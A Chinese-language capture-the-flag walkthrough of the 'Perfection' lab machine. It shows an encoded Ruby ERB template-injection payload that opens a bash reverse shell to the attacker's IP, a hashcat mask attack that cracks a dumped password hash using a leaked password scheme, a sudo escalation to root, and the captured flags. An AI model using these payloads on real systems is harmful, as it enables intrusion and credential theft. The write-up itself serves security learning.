# Perfection

:::info

Difficulty: Easy

Operating System: Linux

:::

## 信息收集

```plaintext
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
```

## web 服务

![img](img/image_20240323-102325.png)

使用 `Burp Suite` 进行抓包

```plaintext
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
Content-Length: 161
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.253
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.253/weighted-grade-calc
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

category1=as&grade1=1&weight1=100&category2=as&grade2=1&weight2=0&category3=as&grade3=1&weight3=0&category4=as&grade4=1&weight4=0&category5=as&grade5=1&weight5=0
```

## SSTI - Ruby

结合网站所使用的框架 `WEBrick 1.7.0` 信息，尝试使用 SSTI 进行注入

[SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)

```plaintext
<%= system("bash -c'/bin/bash -i>& /dev/tcp/10.10.16.3/9999 0>&1'") %>
```

对其进行编码处理

```plaintext
abc%0a<%25=%20system("bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F9999%200%3E%261%27")%20%25>
```

然后发包

```plaintext
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
Content-Length: 281
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.253
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.253/weighted-grade-calc
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

grade1=1&weight1=100&category2=as&grade2=1&weight2=0&category3=as&grade3=1&weight3=0&category4=as&grade4=1&weight4=0&category5=as&grade5=1&weight5=0&category1=abc%0a<%25=%20system("bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F9999%200%3E%261%27")%20%25>
```

即可收到回连的 shell

## User - susan

```shell
┌──(randark ㉿ kali)-[~]
└─$ pwncat-cs -lp 9999
[10:25:46] Welcome to pwncat 🐈!
[10:49:20] received connection from 10.10.11.253:55950
[10:49:29] 10.10.11.253:55950: registered new host w/ db
(local) pwncat$ back
(remote) susan@perfection:/home/susan/ruby_app$ whoami
susan
```

### flag - user

```shell
(remote) susan@perfection:/home/susan$ cat user.txt
ca7858ea6597f30db9a3318e380a8447
```

### 环境探测

```shell
(remote) susan@perfection:/home/susan$ ls -lah
total 48K
drwxr-x--- 7 susan susan 4.0K Feb 26 09:41 .
drwxr-xr-x 3 root  root  4.0K Oct 27 10:36 ..
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan 3.7K Feb 27  2023 .bashrc
drwx------ 2 susan susan 4.0K Oct 27 10:36 .cache
drwx------ 3 susan susan 4.0K Oct 27 10:36 .gnupg
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan 4.0K Oct 27 10:36 .local
drwxr-xr-x 2 root  root  4.0K Oct 27 10:36 Migration
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan 4.0K Oct 27 10:36 ruby_app
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
-rw-r--r-- 1 susan susan    0 Oct 27 06:41 .sudo_as_admin_successful
-rw-r----- 1 root  susan   33 Mar  9 02:04 user.txt
-rw-r--r-- 1 susan susan   39 Oct 17 12:26 .vimrc
```

在其中发现有 `.sqlite_history` 文件

同时，找到 `./Migration/pupilpath_credentials.db` 文件，下载到本地进行数据库读取

在数据库中，有 `user` 表

| id  |      name      |                             password                             |
| :-: | :------------: | :--------------------------------------------------------------: |
|  1  |  Susan Miller  | abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f |
|  2  |   Tina Smith   | dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57 |
|  3  |  Harry Tyler   | d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393 |
|  4  | David Lawrence | ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a |
|  5  | Stephen Locke  | 154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8 |

暂时无法确定哈希的格式

同时，找到一封邮件 `/var/spool/mail/susan`

```plaintext
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

### 密码哈希爆破

```shell
PS D:\_Tools\hashcat-6.2.6> .\hashcat.exe -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

得到密码之后，就可以访问 `sudo` 了

```shell
(remote) susan@perfection:/var/spool/mail$ sudo -l
[sudo] password for susan: <susan_nasus_413759210>
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

## User - root

```shell
(remote) susan@perfection:/var/spool/mail$ sudo -i
root@perfection:~# whoami
root
```

### flag - root

```shell
root@perfection:~# cat root.txt
49af4f82e3665ca3d0f3187ea474e5f8
```
